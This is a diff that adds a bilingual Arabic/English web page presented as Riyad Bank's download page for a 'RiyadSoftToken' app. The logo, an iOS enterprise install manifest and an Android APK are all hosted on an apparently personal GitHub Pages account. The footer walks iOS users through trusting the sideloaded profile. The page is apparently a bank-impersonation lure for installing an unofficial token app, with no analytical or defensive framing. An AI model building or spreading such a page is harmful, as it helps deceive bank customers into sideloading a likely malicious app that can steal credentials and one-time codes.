@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تحميل RiyadSoftToken</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: "Tahoma", sans-serif;
+      background-color: #f5f5f5;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      transition: direction 0.3s, text-align 0.3s;
+    }
+
+    .header {
+      background-color: #005c9c;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .header img {
+      height: 60px;
+    }
+
+    .lang-toggle {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      background-color: #eee;
+      padding: 8px 16px;
+      border-radius: 8px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .container {
+      padding: 30px;
+    }
+
+    h1 {
+      color: #005c9c;
+      margin-top: 20px;
+    }
+
+    p {
+      font-size: 18px;
+      color: #333;
+      margin-bottom: 30px;
+    }
+
+    .btn-row {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .download-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 15px 25px;
+      border-radius: 8px;
+      font-size: 18px;
+      text-decoration: none;
+      color: white;
+      width: 220px;
+      transition: 0.3s;
+    }
+
+    .ios {
+      background-color: #005c9c;
+    }
+
+    .android {
+      background-color: #34a853;
+    }
+
+    .download-btn img {
+      height: 24px;
+      margin-left: 10px;
+    }
+
+    .footer {
+      margin-top: 60px;
+      color: #888;
+      font-size: 14px;
+    }
+
+    @media (max-width: 500px) {
+      .download-btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="lang-toggle" onclick="toggleLang()">EN / AR</div>
+
+  <div class="header">
+<img src="https://abod1755.github.io/RB/riyad-bank-logo.webp" alt="شعار بنك الرياض" style="height: 200px;">
+  </div>
+
+  <div class="container">
+    <h1 id="title">تحميل تطبيق RiyadSoftToken</h1>
+    <p id="subtitle">يرجى اختيار نظام التشغيل المناسب لجهازك</p>
+
+    <div class="btn-row">
+      <!-- iOS button -->
+      <a class="download-btn ios" href="itms-services://?action=download-manifest&url=https://abod1755.github.io/RB/manifest.plist">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Apple_logo_white.svg" alt="iOS">
+        <span id="btn-ios">تحميل لـ iOS</span>
+      </a>
+
+      <!-- Android button -->
+      <a class="download-btn android" href="https://abod1755.github.io/RB/com.rb.RiyadSG.apk">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android">
+        <span id="btn-android">تحميل لـ Android</span>
+      </a>
+    </div>
+
+    <div class="footer" id="footer">
+      <p><strong>ملاحظة:</strong></p>
+      <p>لمنح الثقة للتطبيق على iOS: الإعدادات > عام > VPN وإدارة الجهاز > Riyad Bank > الثقة في التطبيق</p>
+      <p>© بنك الرياض 2025</p>
+    </div>
+  </div>
+
+  <script>
+    let lang = 'ar';
+
+    const translations = {
+      ar: {
+        dir: 'rtl',
+        lang: 'ar',
+        title: 'تحميل تطبيق RiyadSoftToken',
+        subtitle: 'يرجى اختيار نظام التشغيل المناسب لجهازك',
+        btnIos: 'تحميل لـ iOS',
+        btnAndroid: 'تحميل لـ Android',
+        footer: `
+          <p><strong>ملاحظة:</strong></p>
+          <p>لمنح الثقة للتطبيق على iOS: الإعدادات > عام > VPN وإدارة الجهاز > Riyad Bank > الثقة في التطبيق</p>
+          <p>© بنك الرياض 2025</p>
+        `
+      },
+      en: {
+        dir: 'ltr',
+        lang: 'en',
+        title: 'Download RiyadSoftToken App',
+        subtitle: 'Please select the appropriate operating system for your device',
+        btnIos: 'Download for iOS',
+        btnAndroid: 'Download for Android',
+        footer: `
+          <p><strong>Note:</strong></p>
+          <p>To trust the app on iOS: go to Settings > General > VPN & Device Management > Riyad Bank > Trust the app</p>
+          <p>© Riyad Bank 2025</p>
+        `
+      }
+    };
+
+    function toggleLang() {
+      lang = lang === 'ar' ? 'en' : 'ar';
+      const t = translations[lang];
+      document.documentElement.dir = t.dir;
+      document.documentElement.lang = t.lang;
+      document.getElementById("title").innerText = t.title;
+      document.getElementById("subtitle").innerText = t.subtitle;
+      document.getElementById("btn-ios").innerText = t.btnIos;
+      document.getElementById("btn-android").innerText = t.btnAndroid;
+      document.getElementById("footer").innerHTML = t.footer;
+    }
+  </script>
+
+</body>
+</html>
